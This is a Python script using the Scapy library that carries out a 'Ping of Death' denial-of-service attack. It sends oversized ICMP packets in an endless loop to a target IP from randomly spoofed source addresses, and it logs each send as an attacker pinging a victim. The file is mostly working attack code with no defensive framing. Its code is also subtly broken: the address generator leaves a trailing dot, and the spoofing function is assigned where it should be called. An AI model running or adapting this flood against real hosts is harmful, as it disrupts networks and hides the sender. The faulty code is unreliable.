#Extra packages needed for this to run: Scapy.py
from scapy.all import *
from datetime import datetime
import random

TARGET_MACHINE_IP = ""

def random_address_generator():
    """ Generate a random spoofed src ip address"""
    addr = [1,1,1,1]
    d = "."
    addr[0] = str(random.randrange(11,197))
    addr[1] = str(random.randrange(0,255))
    addr[2] = str(random.randrange(0,255))
    addr[3] = str(random.randrange(2,254))
    return (addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d)


if __name__ == "__main__":

    # The Ping of death algorithm works
    # by generating a random spoofed ip address
    # and then sending a big IPV4 packet
    while 1:
        spoofed_ip = random_address_generator
        time = datetime.now()
        print("[{0}]: Attacker PC pinging victim PC with IP:{1} with src IP:{2}".format(time.strftime("%H:%M:%S"),TARGET_MACHINE_IP,spoofed_ip))
        ip_header = IP(src=spoofed_ip, dst=TARGET_MACHINE_IP)
        packet = ip_header/ICMP()/("d"*60000)
        send(packet)



    # for i in range(0,NUM_OF_PACKAGES):
